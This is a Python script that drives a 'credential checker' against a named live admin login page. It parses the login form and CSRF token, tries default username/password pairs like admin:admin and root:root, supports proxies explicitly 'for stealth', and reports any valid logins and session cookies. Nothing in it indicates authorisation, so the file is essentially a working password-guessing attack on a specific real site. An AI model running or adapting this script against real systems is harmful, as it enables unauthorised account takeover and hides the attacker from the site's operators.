#!/usr/bin/env python3
"""
Example usage of the credential checker
"""

from credential_checker import CredentialChecker

# Target login URL
LOGIN_URL = "https://teamspoor.znicrm.com/login.php?type=Admin"

# Example credentials to check
CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("administrator", "admin"),
    ("root", "root"),
]

# Optional: Add proxies for stealth
PROXIES = [
    # "http://proxy1:port",
    # "http://proxy2:port",
]

def main():
    print("=" * 60)
    print("Credential Checker for Admin Login")
    print("=" * 60)
    print(f"Target: {LOGIN_URL}\n")
    
    # Initialize checker
    checker = CredentialChecker(
        login_url=LOGIN_URL,
        proxies=PROXIES if PROXIES else None,
        delay=2.0  # 2 second delay between requests
    )
    
    # Analyze login page first
    print("Step 1: Analyzing login page structure...")
    form_data = checker.analyze_login_page()
    
    if form_data:
        print(f"✅ Form found:")
        print(f"   Method: {form_data.get('method', 'post')}")
        print(f"   Username field: {form_data.get('username_field', 'N/A')}")
        print(f"   Password field: {form_data.get('password_field', 'N/A')}")
        if form_data.get('csrf_token'):
            print(f"   CSRF token: Found")
        print()
    else:
        print("⚠️ Could not analyze form structure, proceeding anyway...\n")
    
    # Check credentials
    print(f"Step 2: Checking {len(CREDENTIALS)} credentials...\n")
    
    valid_accounts = []
    for username, password in CREDENTIALS:
        print(f"Checking: {username}:{password}", end=" ... ")
        
        is_valid, response_info = checker.check_credentials(username, password, form_data)
        
        if is_valid:
            print("✅ VALID")
            valid_accounts.append((username, password))
            print(f"   Response URL: {response_info.get('url', 'N/A')}")
            print(f"   Status Code: {response_info.get('status_code', 'N/A')}")
            if response_info.get('has_session_cookie'):
                print(f"   Session Cookie: Found")
        else:
            print("❌ Invalid")
    
    # Summary
    print("\n" + "=" * 60)
    print(f"Results: {len(valid_accounts)} valid out of {len(CREDENTIALS)} checked")
    if valid_accounts:
        print("\n✅ Valid Accounts:")
        for username, password in valid_accounts:
            print(f"   {username}:{password}")
    print("=" * 60)

if __name__ == '__main__':
    main()
